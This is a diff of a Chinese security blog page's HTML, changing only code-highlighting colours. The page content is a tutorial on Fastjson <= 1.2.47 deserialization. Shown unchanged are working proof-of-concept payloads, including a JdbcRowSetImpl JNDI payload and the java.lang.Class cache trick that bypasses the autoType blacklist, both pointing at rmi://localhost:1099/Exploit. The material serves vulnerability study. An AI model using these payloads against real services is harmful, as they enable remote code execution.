@@ -47,38 +47,38 @@
 &lt;h2 id="fastjson--1247-poc">Fastjson &amp;lt;= 1.2.47 POC&lt;/h2>
 &lt;p>随着 fastjson 的更新，以往的安全漏洞都被封堵掉了，但道高一尺，魔高一丈，安全人员发现了一个通杀的漏洞，以往的封堵手段都可以绕过，算是一个里程碑的发现。&lt;/p>
 &lt;p>我们首先将 fastjson 升级到 1.2.47 版本，然后使用我们之前的POC进行测试。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> com.alibaba.fastjson.JSON;
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.alibaba.fastjson.JSON;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Eval3&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval3&lt;/span> {
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;&lt;/span>;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#a6e22e">parse&lt;/span>(payload);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#50fa7b">parse&lt;/span>(payload);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>不出意料的话会出现这样的错误提示信息：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>autoType is not support. com.sun.rowset.JdbcRowSetImpl
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>autoType is not support. com.sun.rowset.JdbcRowSetImpl
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是因为 fastjson 使用了黑名单机制，禁止将 &lt;code>com.sun.rowset.JdbcRowSetImpl&lt;/code> 反序列化。&lt;/p>
 &lt;p>下面我们使用新的 POC 进行测试，又可以利用成功了。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> com.alibaba.fastjson.JSON;
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.alibaba.fastjson.JSON;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Eval5&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval5&lt;/span> {
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.lang.Class\&amp;#34;,\&amp;#34;val\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;},\&amp;#34;b\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}}&amp;#34;&lt;/span>;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#a6e22e">parse&lt;/span>(payload);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.lang.Class\&amp;#34;,\&amp;#34;val\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;},\&amp;#34;b\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}}&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#50fa7b">parse&lt;/span>(payload);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>payload 格式化之后如下：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#e6db74">&amp;#34;a&amp;#34;&lt;/span>: {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#e6db74">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;java.lang.Class&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#e6db74">&amp;#34;val&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f1fa8c">&amp;#34;a&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;java.lang.Class&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;val&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	},
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#e6db74">&amp;#34;b&amp;#34;&lt;/span>: {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#e6db74">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#e6db74">&amp;#34;dataSourceName&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;rmi://localhost:1099/Exploit&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#e6db74">&amp;#34;autoCommit&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f1fa8c">&amp;#34;b&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;dataSourceName&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;rmi://localhost:1099/Exploit&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;autoCommit&amp;#34;&lt;/span>: &lt;span style="color:#ff79c6">true&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="fastjson--1247-绕过原理">Fastjson &amp;lt;= 1.2.47 绕过原理&lt;/h2>
